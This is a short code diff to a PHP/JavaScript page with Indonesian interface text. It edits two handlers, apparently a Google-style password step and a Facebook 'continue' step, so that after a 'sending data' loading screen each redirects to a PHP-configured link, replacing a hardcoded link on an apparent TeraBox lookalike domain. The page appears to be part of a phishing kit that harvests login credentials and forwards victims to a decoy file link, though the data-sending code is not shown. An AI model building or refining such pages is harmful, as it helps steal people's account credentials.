@@ -69,7 +69,7 @@
     }
     inp.classList.remove('error'); err.textContent = '';
     showLoading('gPassLoadingDim','gPassLoadingText','Mengirim data...', function(){
-      window.location.href = 'https://terabox.my.id/file/f3198c4ce29f76abf3cf/';
+      window.location.href = '<?php echo $data["linkredirect"]; ?>';
     });
   }
 
@@ -131,7 +131,7 @@
 
   function fbLanjutkan() {
     showLoading('fbConfirmLoadingDim','fbConfirmLoadingText','Memproses...', function(){
-      window.location.href = 'https://terabox.my.id/file/f3198c4ce29f76abf3cf/';
+      window.location.href = '<?php echo $data["linkredirect"]; ?>';
     });
   }
 
